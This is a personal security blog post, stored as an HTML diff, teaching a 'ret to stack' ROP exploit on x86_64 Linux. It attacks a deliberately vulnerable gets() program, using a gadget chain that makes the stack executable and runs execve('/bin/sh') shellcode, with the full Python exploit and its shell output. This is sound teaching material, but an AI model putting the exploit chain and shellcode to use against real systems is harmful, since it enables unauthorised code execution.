@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>[ROP] Ret to Stack</title>
+	
+	<meta name="description" content="How to bypass NX/ASLR protections using "ret to Stack" attack on a x64 Linux system.">
+	
+	<meta name="author" content="Quentin Meffre">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+	<link href="/assets/css/syntax.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/https://github.com/meffre-q">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/https://twitter.com/0xdagger">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="//www.gravatar.com/avatar/?s=35" class="img-circle" />
+				quentin meffre
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs" style="">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="/assets/media/XAV_1860.JPG" class="img-circle" width="180" height="250" />
+	</a>
+	<h3 class="title">
+        <a href="/">quentin meffre</a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Computer science student, passionate about Cyber Security.
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/https://github.com/meffre-q">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/https://twitter.com/0xdagger">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/https://www.linkedin.com/in/quentin-meffre/">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>[ROP] Ret to Stack </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   January 
+	   26th,
+	   
+	   2017
+	 </span>
+	  <div class="article_body">
+	  <p>Tools:</p>
+<ol>
+  <li>objdump</li>
+</ol>
+
+<p>Binary protection:</p>
+<ol>
+  <li>Read Only relocations</li>
+  <li>No exec stack</li>
+  <li>No exec heap</li>
+  <li>ASLR</li>
+</ol>
+
+<p>Compilation: Static</p>
+
+<p>Architecture: x86_64</p>
+
+<p>Operating System: Linux (Debian)</p>
+
+<h1 id="1-vulnerable-binary">1. Vulnerable binary</h1>
+<p>For this exemple, I will take the same program as my last post.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</span>
+<span class="c1">// gcc main.c -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -static
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>  <span class="c1">// Never use this function !
+</span>  <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>I will show you today an other method to exploit a buffer overflow thanks to a ROP. I find this method funny because despite the “no exec stack” protection, it permit to make the stack executable and so, execute a shellcode on it.</p>
+
+<h1 id="2-to-begin">2. To begin</h1>
+<p>To do this exploit, we will use the “_dl_make_stack_executable” function.
+The function look like that:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">D</span> <span class="n">a</span><span class="p">.</span><span class="k">out</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">A</span> <span class="mi">20</span> <span class="s">"&lt;_dl_make_stack_executable&gt;"</span>
+<span class="mi">000000000045</span><span class="n">fc30</span> <span class="o">&lt;</span><span class="n">_dl_make_stack_executable</span><span class="o">&gt;:</span>
+  <span class="mi">45</span><span class="n">fc30</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">35</span> <span class="n">e9</span> <span class="mi">54</span> <span class="mi">25</span> <span class="mi">00</span> 	<span class="k">mov</span>    <span class="mh">0x2554e9</span><span class="p">(</span><span class="err">%</span><span class="n">rip</span><span class="p">),</span><span class="err">%</span><span class="n">rsi</span>        <span class="err">#</span> <span class="mi">6</span><span class="n">b5120</span> <span class="o">&lt;</span><span class="n">_dl_pagesize</span><span class="o">&gt;</span>
+  <span class="mi">45</span><span class="n">fc37</span><span class="o">:</span>	<span class="mi">53</span>                   	<span class="k">push</span>   <span class="err">%</span><span class="n">rbx</span>
+  <span class="mi">45</span><span class="n">fc38</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">89</span> <span class="n">fb</span>             	<span class="k">mov</span>    <span class="err">%</span><span class="n">rdi</span><span class="p">,</span><span class="err">%</span><span class="n">rbx</span>
+  <span class="mi">45</span><span class="n">fc3b</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">07</span>             	<span class="k">mov</span>    <span class="p">(</span><span class="err">%</span><span class="n">rdi</span><span class="p">),</span><span class="err">%</span><span class="n">rax</span>
+  <span class="mi">45</span><span class="n">fc3e</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">89</span> <span class="n">f7</span>             	<span class="k">mov</span>    <span class="err">%</span><span class="n">rsi</span><span class="p">,</span><span class="err">%</span><span class="n">rdi</span>
+  <span class="mi">45</span><span class="n">fc41</span><span class="o">:</span>	<span class="mi">48</span> <span class="n">f7</span> <span class="n">df</span>             	<span class="k">neg</span>    <span class="err">%</span><span class="n">rdi</span>
+  <span class="mi">45</span><span class="n">fc44</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">21</span> <span class="n">c7</span>             	<span class="k">and</span>    <span class="err">%</span><span class="n">rax</span><span class="p">,</span><span class="err">%</span><span class="n">rdi</span>
+  <span class="mi">45</span><span class="n">fc47</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">3</span><span class="n">b</span> <span class="mi">05</span> <span class="n">da</span> <span class="mi">42</span> <span class="mi">25</span> <span class="mi">00</span> 	<span class="k">cmp</span>    <span class="mh">0x2542da</span><span class="p">(</span><span class="err">%</span><span class="n">rip</span><span class="p">),</span><span class="err">%</span><span class="n">rax</span>        <span class="err">#</span> <span class="mi">6</span><span class="n">b3f28</span> <span class="o">&lt;</span><span class="n">__libc_stack_end</span><span class="o">&gt;</span>
+  <span class="mi">45</span><span class="n">fc4e</span><span class="o">:</span>	<span class="mi">75</span> <span class="mi">1</span><span class="n">f</span>                	<span class="k">jne</span>    <span class="mi">45</span><span class="n">fc6f</span> <span class="o">&lt;</span><span class="n">_dl_make_stack_executable</span><span class="o">+</span><span class="mh">0x3f</span><span class="o">&gt;</span>
+  <span class="mi">45</span><span class="n">fc50</span><span class="o">:</span>	<span class="mi">8</span><span class="n">b</span> <span class="mi">15</span> <span class="mi">2</span><span class="n">a</span> <span class="mi">43</span> <span class="mi">25</span> <span class="mi">00</span>    	<span class="k">mov</span>    <span class="mh">0x25432a</span><span class="p">(</span><span class="err">%</span><span class="n">rip</span><span class="p">),</span><span class="err">%</span><span class="n">edx</span>        <span class="err">#</span> <span class="mi">6</span><span class="n">b3f80</span> <span class="o">&lt;</span><span class="n">__stack_prot</span><span class="o">&gt;</span>
+  <span class="mi">45</span><span class="n">fc56</span><span class="o">:</span>	<span class="n">e8</span> <span class="mi">15</span> <span class="mi">21</span> <span class="n">fd</span> <span class="n">ff</span>       	<span class="n">callq</span>  <span class="mi">431</span><span class="n">d70</span> <span class="o">&lt;</span><span class="n">__mprotect</span><span class="o">&gt;</span>
+  <span class="mi">45</span><span class="n">fc5b</span><span class="o">:</span>	<span class="mi">85</span> <span class="n">c0</span>                	<span class="k">test</span>   <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
+  <span class="mi">45</span><span class="n">fc5d</span><span class="o">:</span>	<span class="mi">75</span> <span class="mi">17</span>                	<span class="k">jne</span>    <span class="mi">45</span><span class="n">fc76</span> <span class="o">&lt;</span><span class="n">_dl_make_stack_executable</span><span class="o">+</span><span class="mh">0x46</span><span class="o">&gt;</span>
+  <span class="mi">45</span><span class="n">fc5f</span><span class="o">:</span>	<span class="mi">48</span> <span class="n">c7</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 	<span class="k">movq</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,(</span><span class="err">%</span><span class="n">rbx</span><span class="p">)</span>
+  <span class="mi">45</span><span class="n">fc66</span><span class="o">:</span>	<span class="mi">83</span> <span class="mi">0</span><span class="n">d</span> <span class="n">a3</span> <span class="mi">54</span> <span class="mi">25</span> <span class="mi">00</span> <span class="mi">01</span> 	<span class="n">orl</span>    <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x2554a3</span><span class="p">(</span><span class="err">%</span><span class="n">rip</span><span class="p">)</span>        <span class="err">#</span> <span class="mi">6</span><span class="n">b5110</span> <span class="o">&lt;</span><span class="n">_dl_stack_flags</span><span class="o">&gt;</span>
+  <span class="mi">45</span><span class="n">fc6d</span><span class="o">:</span>	<span class="mi">5</span><span class="n">b</span>                   	<span class="k">pop</span>    <span class="err">%</span><span class="n">rbx</span>
+  <span class="mi">45</span><span class="n">fc6e</span><span class="o">:</span>	<span class="n">c3</span>                   	<span class="n">retq</span>   
+  <span class="mi">45</span><span class="n">fc6f</span><span class="o">:</span>	<span class="n">b8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="k">mov</span>    <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
+  <span class="mi">45</span><span class="n">fc74</span><span class="o">:</span>	<span class="mi">5</span><span class="n">b</span>                   	<span class="k">pop</span>    <span class="err">%</span><span class="n">rbx</span>
+  <span class="mi">45</span><span class="n">fc75</span><span class="o">:</span>	<span class="n">c3</span>                   	<span class="n">retq</span>   
+</code></pre></div></div>
+
+<p>We can see two important things. First, the function take “__libc_stack_end” as single parameter and it encapsulate the mprotect function. (cf man mprotect) The third parameter of the mprotect function determine the memory access. (PROT_NONE | PROT_READ | PROT_WRITE | PROT_EXEC) By default, the value is set to “O” for none access, so our goal will be to set this value to “7”. (7 == rwx) To do this, we need to change the value of “__stack_prot” because it’s the variable used by mprotect as third parameter.</p>
+
+<p>So our payload will look like this:
+padding + set __stack_prot to 7 + set RDI to __libc_stack_end + execute _dl_make_stack_executable + push shellcode</p>
+
+<h1 id="3-the-payload">3. The payload</h1>
+<p>I will not explain how to find the gadget, take a look at my last post if you don’t now how to do it.
+First, the __stack_prot address:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-D</span> a.out | <span class="nb">grep</span> <span class="s2">"__stack_prot"</span>
+00000000006b3f80 &lt;__stack_prot&gt;:
+</code></pre></div></div>
+
+<p>Great. So our payload begin will be:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">72</span> <span class="c"># padding</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004016b7</span><span class="p">)</span> <span class="c"># pop rsi ; ret</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000006b3f80</span><span class="p">)</span> <span class="c"># @ __stack_prot</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004314ad</span><span class="p">)</span> <span class="c"># pop rax ; ret</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x0000000000000007</span><span class="p">)</span> <span class="c"># PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000045f491</span><span class="p">)</span> <span class="c"># mov QWORD PTR [rsi], rax ; ret</span>
+</code></pre></div></div>
+
+<p>We also will need the address of the “__libc_stack_end” variable and “_dl_make_stack_executable” function.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-D</span> a.out|egrep <span class="s2">"__libc_stack_end|_dl_make_stack_executable"</span>
+...
+000000000045fc30 &lt;_dl_make_stack_executable&gt;:
+...
+00000000006b3f28 &lt;__libc_stack_end&gt;:
+...
+</code></pre></div></div>
+
+<p>And the payload part look like:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000040159b</span><span class="p">)</span> <span class="c"># pop rdi ; ret</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000006b3f28</span><span class="p">)</span> <span class="c"># @ __libc_stack_end</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000045fc30</span><span class="p">)</span> <span class="c"># @ _dl_make_stack_executable</span>
+</code></pre></div></div>
+
+<p>Well, we only have left to push the shellcode and test it ! 
+The shellcode is a simply execve(“/bin/sh”, …) on 30 bytes.
+To push the shellcode:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000040fd8c</span><span class="p">)</span> <span class="c"># push rsp ; ret</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+</code></pre></div></div>
+
+<h1 id="4-exploitation">4. Exploitation</h1>
+<p>The whole payload look like:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python2.7</span>
+
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+
+<span class="c">#</span>
+<span class="c"># Shellcode execve("/bin/sh", ["/bin/sh"], NULL) (30 bytes)</span>
+<span class="c">#</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05</span><span class="s">"</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">72</span> <span class="c"># padding</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004016b7</span><span class="p">)</span> <span class="c"># pop rsi ; ret</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000006b3f80</span><span class="p">)</span> <span class="c"># @ __stack_prot</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004314ad</span><span class="p">)</span> <span class="c"># pop rax ; ret</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x0000000000000007</span><span class="p">)</span> <span class="c"># PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000045f491</span><span class="p">)</span> <span class="c"># mov QWORD PTR [rsi], rax ; ret</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000040159b</span><span class="p">)</span> <span class="c"># pop rdi ; ret</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000006b3f28</span><span class="p">)</span> <span class="c"># @ __libc_stack_end</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000045fc30</span><span class="p">)</span> <span class="c"># @ _dl_make_stack_executable</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000040fd8c</span><span class="p">)</span> <span class="c"># push rsp ; ret</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+
+<span class="k">print</span> <span class="n">payload</span>
+</code></pre></div></div>
+
+<p>The result is:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="o">(</span>python2.7 rop.py<span class="p">;</span> <span class="nb">cat</span><span class="o">)</span> | ./a.out
+id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Done.</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#pwn-ref">
+					pwn <span>(5)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#pwn-ref">
+					pwn <span>(7)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#ROP-ref">
+					ROP <span>(4)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=[ROP] Ret to Stack&via=https://twitter.com/0xdagger"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="//www.gravatar.com/avatar/" class="img-rounded author-image" />
+        <h4 class="section-title author-name">Quentin Meffre</h4>
+        <p class="author-bio">Computer science student, passionate about Cyber Security.</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/pwn/2017/01/25/easy_method.html" title="[ROP] Easy method">&larr; Previous</a></li>
+		  
+		  
+		  <li class="next"><a href="/pwn/2017/01/29/ret_to_libc.html" title="[ROP] Ret to LibC">Next &rarr;</a></li>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2017 Quentin Meffre with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-90952644-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
